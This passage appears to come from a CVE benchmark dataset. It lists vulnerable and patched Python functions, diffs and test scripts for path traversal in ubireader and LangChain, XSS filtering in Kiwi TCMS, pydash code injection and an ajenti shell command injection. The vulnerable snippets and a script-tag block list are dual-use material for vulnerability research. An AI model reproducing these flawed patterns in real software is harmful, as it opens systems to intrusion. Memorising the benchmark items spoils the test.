        "snippet": "def extract_dents(ubifs, inodes, dent_node, path='', perms=False):\n    if dent_node.inum not in inodes:\n        error(extract_dents, 'Error', 'inum: %s not found in inodes' % (dent_node.inum))\n        return\n\n    inode = inodes[dent_node.inum]\n\n    if not is_safe_path(path, dent_node.name):\n        error(extract_dents, 'Warning', 'Path traversal attempt: %s, discarding' % (dent_node.name))\n        return\n    dent_path = os.path.realpath(os.path.join(path, dent_node.name))\n\n    if dent_node.type == UBIFS_ITYPE_DIR:\n        try:\n            if not os.path.exists(dent_path):\n                os.mkdir(dent_path)\n                log(extract_dents, 'Make Dir: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'DIR Fail: %s' % e)\n\n        if 'dent' in inode:\n            for dnode in inode['dent']:\n                extract_dents(ubifs, inodes, dnode, dent_path, perms)\n\n        _set_file_timestamps(dent_path, inode)\n\n    elif dent_node.type == UBIFS_ITYPE_REG:\n        try:\n            if inode['ino'].nlink > 1:\n                if 'hlink' not in inode:\n                    inode['hlink'] = dent_path\n                    buf = _process_reg_file(ubifs, inode, dent_path)\n                    _write_reg_file(dent_path, buf)\n                else:\n                    os.link(inode['hlink'], dent_path)\n                    log(extract_dents, 'Make Link: %s > %s' % (dent_path, inode['hlink']))\n            else:\n                buf = _process_reg_file(ubifs, inode, dent_path)\n                _write_reg_file(dent_path, buf)\n\n            _set_file_timestamps(dent_path, inode)\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FILE Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_LNK:\n        try:\n            # probably will need to decompress ino data if > UBIFS_MIN_COMPR_LEN\n            os.symlink('%s' % inode['ino'].data.decode('utf-8'), dent_path)\n            log(extract_dents, 'Make Symlink: %s > %s' % (dent_path, inode['ino'].data))\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SYMLINK Fail: %s' % e) \n\n    elif dent_node.type in [UBIFS_ITYPE_BLK, UBIFS_ITYPE_CHR]:\n        try:\n            dev = struct.unpack('<II', inode['ino'].data)[0]\n            if not settings.use_dummy_devices:\n                os.mknod(dent_path, inode['ino'].mode, dev)\n                log(extract_dents, 'Make Device Node: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n            else:\n                log(extract_dents, 'Create dummy device.')\n                _write_reg_file(dent_path, str(dev))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n                \n        except Exception as e:\n            error(extract_dents, 'Warn', 'DEV Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_FIFO:\n        try:\n            os.mkfifo(dent_path, inode['ino'].mode)\n            log(extract_dents, 'Make FIFO: %s' % (path))\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FIFO Fail: %s : %s' % (dent_path, e))\n\n    elif dent_node.type == UBIFS_ITYPE_SOCK:\n        try:\n            if settings.use_dummy_socket_file:\n                _write_reg_file(dent_path, '')\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SOCK Fail: %s : %s' % (dent_path, e))"
      }
    ],
    "vul_patch": "--- a/ubireader/ubifs/output.py\n+++ b/ubireader/ubifs/output.py\n@@ -4,8 +4,12 @@\n         return\n \n     inode = inodes[dent_node.inum]\n-    dent_path = os.path.join(path, dent_node.name)\n-        \n+\n+    if not is_safe_path(path, dent_node.name):\n+        error(extract_dents, 'Warning', 'Path traversal attempt: %s, discarding' % (dent_node.name))\n+        return\n+    dent_path = os.path.realpath(os.path.join(path, dent_node.name))\n+\n     if dent_node.type == UBIFS_ITYPE_DIR:\n         try:\n             if not os.path.exists(dent_path):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-33977",
    "cve_description": "Kiwi TCMS is an open source test management system for both manual and automated testing. Kiwi TCMS allows users to upload attachments to test plans, test cases, etc. Earlier versions of Kiwi TCMS had introduced upload validators in order to prevent potentially dangerous files from being uploaded and Content-Security-Policy definition to prevent cross-site-scripting attacks. The upload validation checks were not 100% robust which left the possibility to circumvent them and upload a potentially dangerous file which allows execution of arbitrary JavaScript in the browser. Additionally we've discovered that Nginx's `proxy_pass` directive will strip some headers negating protections built into Kiwi TCMS when served behind a reverse proxy. This issue has been addressed in version 12.4. Users are advised to upgrade. Users unable to upgrade who are serving Kiwi TCMS behind a reverse proxy should make sure that additional header values are still passed to the client browser. If they aren't redefining them inside the proxy configuration.",
    "cwe_info": {
      "CWE-79": {
        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        "description": "The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users."
      }
    },
    "repo": "https://github.com/kiwitcms/Kiwi",
    "patch_url": [
      "https://github.com/kiwitcms/Kiwi/commit/d789f4b51025de4f8c747c037d02e1b0da80b034"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_21_1",
        "commit": "ce5b83e",
        "file_path": "tcms/kiwi_attachments/validators.py",
        "start_line": 5,
        "end_line": 9,
        "snippet": "def deny_uploads_containing_script_tag(uploaded_file):\n    for chunk in uploaded_file.chunks(2048):\n        if chunk.lower().find(b\"<script\") > -1:\n            raise ValidationError(_(\"File contains forbidden <script> tag\"))\n"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_21_1",
        "commit": "d789f4b",
        "file_path": "tcms/kiwi_attachments/validators.py",
        "start_line": 5,
        "end_line": 11,
        "snippet": "def deny_uploads_containing_script_tag(uploaded_file):\n    for chunk in uploaded_file.chunks(2048):\n        if chunk.lower().find(b\"<script\") > -1:\n            raise ValidationError(_(\"File contains forbidden <script> tag\"))\n\n        if chunk.lower().find(b\"onload=\") > -1:\n            raise ValidationError(_(\"File contains forbidden attribute:\") + \"onload\")"
      }
    ],
    "vul_patch": "--- a/tcms/kiwi_attachments/validators.py\n+++ b/tcms/kiwi_attachments/validators.py\n@@ -2,3 +2,6 @@\n     for chunk in uploaded_file.chunks(2048):\n         if chunk.lower().find(b\"<script\") > -1:\n             raise ValidationError(_(\"File contains forbidden <script> tag\"))\n+\n+        if chunk.lower().find(b\"onload=\") > -1:\n+            raise ValidationError(_(\"File contains forbidden attribute:\") + \"onload\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-33977:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/kiwi\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-33977/bin/python  hand_test.py\n",
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-26145",
    "cve_description": "This affects versions of the package pydash before 6.0.0. A number of pydash methods such as pydash.objects.invoke() and pydash.collections.invoke_map() accept dotted paths (Deep Path Strings) to target a nested Python object, relative to the original source object. These paths can be used to target internal class attributes and dict items, to retrieve, modify or invoke nested Python objects.\r\r**Note:**\r\rThe pydash.objects.invoke() method is vulnerable to Command Injection when the following prerequisites are satisfied:\r\r1) The source object (argument 1) is not a built-in object such as list/dict (otherwise, the __init__.__globals__ path is not accessible)\r\r2) The attacker has control over argument 2 (the path string) and argument 3 (the argument to pass to the invoked method)\r\r\rThe pydash.collections.invoke_map() method is also vulnerable, but is harder to exploit as the attacker does not have direct control over the argument to be passed to the invoked function.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/dgilland/pydash",
    "patch_url": [
      "https://github.com/dgilland/pydash/commit/6ff0831ad285fff937cafd2a853f20cc9ae92021"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_43_1",
        "commit": "1947d2a",
        "file_path": "src/pydash/helpers.py",
        "start_line": 178,
        "end_line": 186,
        "snippet": "def _base_get_object(obj, key, default=UNSET):\n    value = _base_get_item(obj, key, default=UNSET)\n    if value is UNSET:\n        value = default\n        try:\n            value = getattr(obj, key)\n        except Exception:\n            pass\n    return value"
      },
      {
        "id": "vul_py_43_2",
        "commit": "1947d2a",
        "file_path": "src/pydash/helpers.py",
        "start_line": 189,
        "end_line": 218,
        "snippet": "def base_set(obj, key, value, allow_override=True):\n    \"\"\"\n    Set an object's `key` to `value`. If `obj` is a ``list`` and the `key` is the next available\n    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.\n\n    Args:\n        obj (list|dict): Object to assign value to.\n        key (mixed): Key or index to assign to.\n        value (mixed): Value to assign.\n        allow_override (bool): Whether to allow overriding a previously set key.\n    \"\"\"\n    if isinstance(obj, dict):\n        if allow_override or key not in obj:\n            obj[key] = value\n    elif isinstance(obj, list):\n        key = int(key)\n\n        if key < len(obj):\n            if allow_override:\n                obj[key] = value\n        else:\n            if key > len(obj):\n                # Pad list object with None values up to the index key so we can append the value\n                # into the key index.\n                obj[:] = (obj + [None] * key)[:key]\n            obj.append(value)\n    elif (allow_override or not hasattr(obj, key)) and obj is not None:\n        setattr(obj, key, value)\n\n    return obj"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_43_1",
        "commit": "6ff0831ad285fff937cafd2a853f20cc9ae92021",
        "file_path": "src/pydash/helpers.py",
        "start_line": 178,
        "end_line": 187,
        "snippet": "def _base_get_object(obj, key, default=UNSET):\n    value = _base_get_item(obj, key, default=UNSET)\n    if value is UNSET:\n        _raise_if_restricted_key(key)\n        value = default\n        try:\n            value = getattr(obj, key)\n        except Exception:\n            pass\n    return value"
      },
      {
        "id": "fix_py_43_2",
        "commit": "6ff0831ad285fff937cafd2a853f20cc9ae92021",
        "file_path": "src/pydash/helpers.py",
        "start_line": 197,
        "end_line": 227,
        "snippet": "def base_set(obj, key, value, allow_override=True):\n    \"\"\"\n    Set an object's `key` to `value`. If `obj` is a ``list`` and the `key` is the next available\n    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.\n\n    Args:\n        obj (list|dict): Object to assign value to.\n        key (mixed): Key or index to assign to.\n        value (mixed): Value to assign.\n        allow_override (bool): Whether to allow overriding a previously set key.\n    \"\"\"\n    if isinstance(obj, dict):\n        if allow_override or key not in obj:\n            obj[key] = value\n    elif isinstance(obj, list):\n        key = int(key)\n\n        if key < len(obj):\n            if allow_override:\n                obj[key] = value\n        else:\n            if key > len(obj):\n                # Pad list object with None values up to the index key so we can append the value\n                # into the key index.\n                obj[:] = (obj + [None] * key)[:key]\n            obj.append(value)\n    elif (allow_override or not hasattr(obj, key)) and obj is not None:\n        _raise_if_restricted_key(key)\n        setattr(obj, key, value)\n\n    return obj"
      },
      {
        "id": "fix_py_43_3",
        "commit": "6ff0831ad285fff937cafd2a853f20cc9ae92021",
        "file_path": "src/pydash/helpers.py",
        "start_line": 19,
        "end_line": 196,
        "snippet": "\n#: Dictionary of builtins with keys as the builtin function and values as the string name.\nBUILTINS = {value: key for key, value in builtins.__dict__.items() if isinstance(value, Hashable)}\n\n\ndef callit(iteratee, *args, **kwargs):\n    \"\"\"Inspect argspec of `iteratee` function and only pass the supported arguments when calling\n    it.\"\"\"\n    maxargs = len(args)\n    argcount = kwargs[\"argcount\"] if \"argcount\" in kwargs else getargcount(iteratee, maxargs)\n    argstop = min([maxargs, argcount])\n\n    return iteratee(*args[:argstop])\n\n\ndef getargcount(iteratee, maxargs):\n    \"\"\"Return argument count of iteratee function.\"\"\"\n    if hasattr(iteratee, \"_argcount\"):\n        # Optimization feature where argcount of iteratee is known and properly\n        # set by initiator.\n        return iteratee._argcount\n\n    if isinstance(iteratee, type) or pyd.is_builtin(iteratee):\n        # Only pass single argument to type iteratees or builtins.\n        argcount = 1\n    else:\n        argcount = 1\n\n        try:\n            argcount = _getargcount(iteratee, maxargs)\n        except TypeError:  # pragma: no cover\n            pass\n\n    return argcount\n\n\ndef _getargcount(iteratee, maxargs):\n    argcount = None\n\n    try:\n        # PY2: inspect.signature was added in Python 3.\n        # Try to use inspect.signature when possible since it works better for our purpose of\n        # getting the iteratee argcount since it takes into account the \"self\" argument in callable\n        # classes.\n        sig = inspect.signature(iteratee)\n    except (TypeError, ValueError, AttributeError):\n        pass\n    else:  # pragma: no cover\n        if not any(\n            param.kind == inspect.Parameter.VAR_POSITIONAL for param in sig.parameters.values()\n        ):\n            argcount = len(sig.parameters)\n\n    if argcount is None:\n        argspec = getfullargspec(iteratee)\n        if argspec and not argspec.varargs:  # pragma: no cover\n            # Use inspected arg count.\n            argcount = len(argspec.args)\n\n    if argcount is None:\n        # Assume all args are handleable.\n        argcount = maxargs\n\n    return argcount\n\n\ndef iteriteratee(obj, iteratee=None, reverse=False):\n    \"\"\"Return iterative iteratee based on collection type.\"\"\"\n    if iteratee is None:\n        cbk = pyd.identity\n        argcount = 1\n    else:\n        cbk = pyd.iteratee(iteratee)\n        argcount = getargcount(cbk, maxargs=3)\n\n    items = iterator(obj)\n\n    if reverse:\n        items = reversed(tuple(items))\n\n    for key, item in items:\n        yield callit(cbk, item, key, obj, argcount=argcount), item, key, obj\n\n\ndef iterator(obj):\n    \"\"\"Return iterative based on object type.\"\"\"\n    if isinstance(obj, Mapping):\n        return obj.items()\n    elif hasattr(obj, \"iteritems\"):\n        return obj.iteritems()  # noqa: B301\n    elif hasattr(obj, \"items\"):\n        return iter(obj.items())\n    elif isinstance(obj, Iterable):\n        return enumerate(obj)\n    else:\n        return getattr(obj, \"__dict__\", {}).items()\n\n\ndef base_get(obj, key, default=UNSET):\n    \"\"\"\n    Safely get an item by `key` from a sequence or mapping object when `default` provided.\n\n    Args:\n        obj (list|dict): Sequence or mapping to retrieve item from.\n        key (mixed): Key or index identifying which item to retrieve.\n        default (mixed, optional): Default value to return if `key` not found in `obj`.\n\n    Returns:\n        mixed: `obj[key]`, `obj.key`, or `default`.\n\n    Raises:\n        KeyError: If `obj` is missing key, index, or attribute and no default value provided.\n    \"\"\"\n    if isinstance(obj, dict):\n        value = _base_get_dict(obj, key, default=default)\n    elif not isinstance(obj, (Mapping, Sequence)) or (\n        isinstance(obj, tuple) and hasattr(obj, \"_fields\")\n    ):\n        # Don't use getattr for dict/list objects since we don't want class methods/attributes\n        # returned for them but do allow getattr for namedtuple.\n        value = _base_get_object(obj, key, default=default)\n    else:\n        value = _base_get_item(obj, key, default=default)\n\n    if value is UNSET:\n        # Raise if there's no default provided.\n        raise KeyError(f'Object \"{repr(obj)}\" does not have key \"{key}\"')\n\n    return value\n\n\ndef _base_get_dict(obj, key, default=UNSET):\n    value = obj.get(key, UNSET)\n    if value is UNSET:\n        value = default\n        if not isinstance(key, int):\n            # Try integer key fallback.\n            try:\n                value = obj.get(int(key), default)\n            except Exception:\n                pass\n    return value\n\n\ndef _base_get_item(obj, key, default=UNSET):\n    try:\n        return obj[key]\n    except Exception:\n        pass\n\n    if not isinstance(key, int):\n        try:\n            return obj[int(key)]\n        except Exception:\n            pass\n\n    return default\n\n\ndef _base_get_object(obj, key, default=UNSET):\n    value = _base_get_item(obj, key, default=UNSET)\n    if value is UNSET:\n        _raise_if_restricted_key(key)\n        value = default\n        try:\n            value = getattr(obj, key)\n        except Exception:\n            pass\n    return value\n\n\ndef _raise_if_restricted_key(key):\n    # Prevent access to dunder-methods since this could expose access to globals through leaky\n    # attributes such as obj.__init__.__globals__.\n    if len(key) > 4 and key.isascii() and key.startswith(\"__\") and key.endswith(\"__\"):\n        raise KeyError(f\"access to restricted key {key!r} is not allowed\")\n\n"
      }
    ],
    "vul_patch": "--- a/src/pydash/helpers.py\n+++ b/src/pydash/helpers.py\n@@ -1,6 +1,7 @@\n def _base_get_object(obj, key, default=UNSET):\n     value = _base_get_item(obj, key, default=UNSET)\n     if value is UNSET:\n+        _raise_if_restricted_key(key)\n         value = default\n         try:\n             value = getattr(obj, key)\n\n--- a/src/pydash/helpers.py\n+++ b/src/pydash/helpers.py\n@@ -25,6 +25,7 @@\n                 obj[:] = (obj + [None] * key)[:key]\n             obj.append(value)\n     elif (allow_override or not hasattr(obj, key)) and obj is not None:\n+        _raise_if_restricted_key(key)\n         setattr(obj, key, value)\n \n     return obj\n\n--- /dev/null\n+++ b/src/pydash/helpers.py\n@@ -0,0 +1,177 @@\n+\n+#: Dictionary of builtins with keys as the builtin function and values as the string name.\n+BUILTINS = {value: key for key, value in builtins.__dict__.items() if isinstance(value, Hashable)}\n+\n+\n+def callit(iteratee, *args, **kwargs):\n+    \"\"\"Inspect argspec of `iteratee` function and only pass the supported arguments when calling\n+    it.\"\"\"\n+    maxargs = len(args)\n+    argcount = kwargs[\"argcount\"] if \"argcount\" in kwargs else getargcount(iteratee, maxargs)\n+    argstop = min([maxargs, argcount])\n+\n+    return iteratee(*args[:argstop])\n+\n+\n+def getargcount(iteratee, maxargs):\n+    \"\"\"Return argument count of iteratee function.\"\"\"\n+    if hasattr(iteratee, \"_argcount\"):\n+        # Optimization feature where argcount of iteratee is known and properly\n+        # set by initiator.\n+        return iteratee._argcount\n+\n+    if isinstance(iteratee, type) or pyd.is_builtin(iteratee):\n+        # Only pass single argument to type iteratees or builtins.\n+        argcount = 1\n+    else:\n+        argcount = 1\n+\n+        try:\n+            argcount = _getargcount(iteratee, maxargs)\n+        except TypeError:  # pragma: no cover\n+            pass\n+\n+    return argcount\n+\n+\n+def _getargcount(iteratee, maxargs):\n+    argcount = None\n+\n+    try:\n+        # PY2: inspect.signature was added in Python 3.\n+        # Try to use inspect.signature when possible since it works better for our purpose of\n+        # getting the iteratee argcount since it takes into account the \"self\" argument in callable\n+        # classes.\n+        sig = inspect.signature(iteratee)\n+    except (TypeError, ValueError, AttributeError):\n+        pass\n+    else:  # pragma: no cover\n+        if not any(\n+            param.kind == inspect.Parameter.VAR_POSITIONAL for param in sig.parameters.values()\n+        ):\n+            argcount = len(sig.parameters)\n+\n+    if argcount is None:\n+        argspec = getfullargspec(iteratee)\n+        if argspec and not argspec.varargs:  # pragma: no cover\n+            # Use inspected arg count.\n+            argcount = len(argspec.args)\n+\n+    if argcount is None:\n+        # Assume all args are handleable.\n+        argcount = maxargs\n+\n+    return argcount\n+\n+\n+def iteriteratee(obj, iteratee=None, reverse=False):\n+    \"\"\"Return iterative iteratee based on collection type.\"\"\"\n+    if iteratee is None:\n+        cbk = pyd.identity\n+        argcount = 1\n+    else:\n+        cbk = pyd.iteratee(iteratee)\n+        argcount = getargcount(cbk, maxargs=3)\n+\n+    items = iterator(obj)\n+\n+    if reverse:\n+        items = reversed(tuple(items))\n+\n+    for key, item in items:\n+        yield callit(cbk, item, key, obj, argcount=argcount), item, key, obj\n+\n+\n+def iterator(obj):\n+    \"\"\"Return iterative based on object type.\"\"\"\n+    if isinstance(obj, Mapping):\n+        return obj.items()\n+    elif hasattr(obj, \"iteritems\"):\n+        return obj.iteritems()  # noqa: B301\n+    elif hasattr(obj, \"items\"):\n+        return iter(obj.items())\n+    elif isinstance(obj, Iterable):\n+        return enumerate(obj)\n+    else:\n+        return getattr(obj, \"__dict__\", {}).items()\n+\n+\n+def base_get(obj, key, default=UNSET):\n+    \"\"\"\n+    Safely get an item by `key` from a sequence or mapping object when `default` provided.\n+\n+    Args:\n+        obj (list|dict): Sequence or mapping to retrieve item from.\n+        key (mixed): Key or index identifying which item to retrieve.\n+        default (mixed, optional): Default value to return if `key` not found in `obj`.\n+\n+    Returns:\n+        mixed: `obj[key]`, `obj.key`, or `default`.\n+\n+    Raises:\n+        KeyError: If `obj` is missing key, index, or attribute and no default value provided.\n+    \"\"\"\n+    if isinstance(obj, dict):\n+        value = _base_get_dict(obj, key, default=default)\n+    elif not isinstance(obj, (Mapping, Sequence)) or (\n+        isinstance(obj, tuple) and hasattr(obj, \"_fields\")\n+    ):\n+        # Don't use getattr for dict/list objects since we don't want class methods/attributes\n+        # returned for them but do allow getattr for namedtuple.\n+        value = _base_get_object(obj, key, default=default)\n+    else:\n+        value = _base_get_item(obj, key, default=default)\n+\n+    if value is UNSET:\n+        # Raise if there's no default provided.\n+        raise KeyError(f'Object \"{repr(obj)}\" does not have key \"{key}\"')\n+\n+    return value\n+\n+\n+def _base_get_dict(obj, key, default=UNSET):\n+    value = obj.get(key, UNSET)\n+    if value is UNSET:\n+        value = default\n+        if not isinstance(key, int):\n+            # Try integer key fallback.\n+            try:\n+                value = obj.get(int(key), default)\n+            except Exception:\n+                pass\n+    return value\n+\n+\n+def _base_get_item(obj, key, default=UNSET):\n+    try:\n+        return obj[key]\n+    except Exception:\n+        pass\n+\n+    if not isinstance(key, int):\n+        try:\n+            return obj[int(key)]\n+        except Exception:\n+            pass\n+\n+    return default\n+\n+\n+def _base_get_object(obj, key, default=UNSET):\n+    value = _base_get_item(obj, key, default=UNSET)\n+    if value is UNSET:\n+        _raise_if_restricted_key(key)\n+        value = default\n+        try:\n+            value = getattr(obj, key)\n+        except Exception:\n+            pass\n+    return value\n+\n+\n+def _raise_if_restricted_key(key):\n+    # Prevent access to dunder-methods since this could expose access to globals through leaky\n+    # attributes such as obj.__init__.__globals__.\n+    if len(key) > 4 and key.isascii() and key.startswith(\"__\") and key.endswith(\"__\"):\n+        raise KeyError(f\"access to restricted key {key!r} is not allowed\")\n+\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-26145:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/pydash\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-26145/bin/python  hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-26145:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/pydash\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-26145/bin/python -m pytest tests/test_objects.py -v"
  },
  {
    "cve_id": "CVE-2024-3571",
    "cve_description": "langchain-ai/langchain is vulnerable to path traversal due to improper limitation of a pathname to a restricted directory ('Path Traversal') in its LocalFileStore functionality. An attacker can leverage this vulnerability to read or write files anywhere on the filesystem, potentially leading to information disclosure or remote code execution. The issue lies in the handling of file paths in the mset and mget methods, where user-supplied input is not adequately sanitized, allowing directory traversal sequences to reach unintended directories.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/langchain-ai/langchain",
    "patch_url": [
      "https://github.com/langchain-ai/langchain/commit/aad3d8bd47d7f5598156ff2bdcc8f736f24a7412"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_28_1",
        "commit": "501cc83",
        "file_path": "libs/langchain/langchain/storage/file_system.py",
        "start_line": 38,
        "end_line": 45,
        "snippet": "    def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path)"
      },
      {
        "id": "vul_py_28_2",
        "commit": "501cc83",
        "file_path": "libs/langchain/langchain/storage/file_system.py",
        "start_line": 47,
        "end_line": 58,
        "snippet": "    def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        return self.root_path / key"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_28_1",
        "commit": "aad3d8b",
        "file_path": "libs/langchain/langchain/storage/file_system.py",
        "start_line": 39,
        "end_line": 46,
        "snippet": "    def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path).absolute()"
      },
      {
        "id": "fix_py_28_2",
        "commit": "aad3d8b",
        "file_path": "libs/langchain/langchain/storage/file_system.py",
        "start_line": 48,
        "end_line": 67,
        "snippet": "    def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        full_path = os.path.abspath(self.root_path / key)\n        common_path = os.path.commonpath([str(self.root_path), full_path])\n        if common_path != str(self.root_path):\n            raise InvalidKeyException(\n                f\"Invalid key: {key}. Key should be relative to the full path.\"\n                f\"{self.root_path} vs. {common_path} and full path of {full_path}\"\n            )\n\n        return Path(full_path)"
      }
    ],
    "vul_patch": "--- a/libs/langchain/langchain/storage/file_system.py\n+++ b/libs/langchain/langchain/storage/file_system.py\n@@ -5,4 +5,4 @@\n             root_path (Union[str, Path]): The root path of the file store. All keys are\n                 interpreted as paths relative to this root.\n         \"\"\"\n-        self.root_path = Path(root_path)\n+        self.root_path = Path(root_path).absolute()\n\n--- a/libs/langchain/langchain/storage/file_system.py\n+++ b/libs/langchain/langchain/storage/file_system.py\n@@ -9,4 +9,12 @@\n         \"\"\"\n         if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n             raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n-        return self.root_path / key\n+        full_path = os.path.abspath(self.root_path / key)\n+        common_path = os.path.commonpath([str(self.root_path), full_path])\n+        if common_path != str(self.root_path):\n+            raise InvalidKeyException(\n+                f\"Invalid key: {key}. Key should be relative to the full path.\"\n+                f\"{self.root_path} vs. {common_path} and full path of {full_path}\"\n+            )\n+\n+        return Path(full_path)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-3571:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/langchain\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd ./libs/langchain && /workspace/PoC_env/CVE-2024-3571/bin/python -m pytest tests/unit_tests/storage/test_filesystem.py -v -k \"test_catches_forbidden_keys\" -c /dev/null",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-3571:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/langchain\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd ./libs/langchain && /workspace/PoC_env/CVE-2024-3571/bin/python -m pytest tests/unit_tests/storage/test_filesystem.py -v -c /dev/null\n"
  },
  {
    "cve_id": "CVE-2019-25066",
    "cve_description": "A vulnerability has been found in ajenti 2.1.31 and classified as critical. This vulnerability affects unknown code of the component API. The manipulation leads to privilege escalation. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 2.1.32 is able to address this issue. The name of the patch is 7aa146b724e0e20cfee2c71ca78fafbf53a8767c. It is recommended to upgrade the affected component.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ajenti/ajenti",
    "patch_url": [
      "https://github.com/ajenti/ajenti/commit/7aa146b724e0e20cfee2c71ca78fafbf53a8767c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_204_1",
        "commit": "ef385f9",
        "file_path": "ajenti-core/aj/auth.py",
        "start_line": 100,
        "end_line": 115,
        "snippet": "    def authenticate(self, username, password):\n        child = None\n        try:\n            child = pexpect.spawn('/bin/sh', ['-c', '/bin/su -c \"/bin/echo SUCCESS\" - %s' % username], timeout=5)\n            child.expect('.*:')\n            child.sendline(password)\n            result = child.expect(['su: .*', 'SUCCESS'])\n        except Exception as err:\n            if child and child.isalive():\n                child.close()\n            logging.error('Error checking password: %s', err)\n            return False\n        if result == 0:\n            return False\n        else:\n            return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_204_1",
        "commit": "7aa146b",
        "file_path": "ajenti-core/aj/auth.py",
        "start_line": 101,
        "end_line": 122,
